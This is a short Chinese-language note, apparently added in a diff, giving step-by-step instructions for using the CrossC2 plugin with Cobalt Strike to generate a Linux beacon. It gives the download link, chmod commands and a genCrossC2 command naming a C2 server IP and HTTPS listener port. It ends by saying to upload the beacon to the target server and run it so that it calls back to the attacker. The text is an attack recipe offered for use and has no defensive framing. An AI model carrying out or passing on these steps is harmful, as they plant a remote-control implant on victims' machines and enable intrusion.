@@ -1,0 +1,25 @@
+CobaltStrike本身并不支持生成linux类型的payload，此处我们需要借用CrossC2插件来生成，此插件目前仅支持HTTPS监听
+
+https://github.com/gloxec/CrossC2
+我们可以在不同平台下使用CrossC2来生成payload，下载相对应CrossC2文件
+
+这里使用Linux平台生成payload，只需要下载genCrossC2.Linux，不用下载其他文件
+
+下载genCrossC2.Linux，上传到CobaltStrike服务端Server目录下
+
+给与可执行权限：chmod +x genCrossC2.Linux
+
+客户端添加HTTPS监听，切记是https，因为CrossC2只支持反向https和正向tcp
+
+在linux服务端目录执行：## 服务端的ip跟https的监听端口
+./genCrossC2.Linux 192.168.0.98 19000 ./.cobaltstrike.beacon_keys ";;./c2.profile" Linux x64 beacon.out
+
+生成的beacon.out这个自定义的名称shell上传到目标服务器
+
+给与可执行权限：chmod +x beacon.out
+
+运行shell
+
+cs上线
+
+
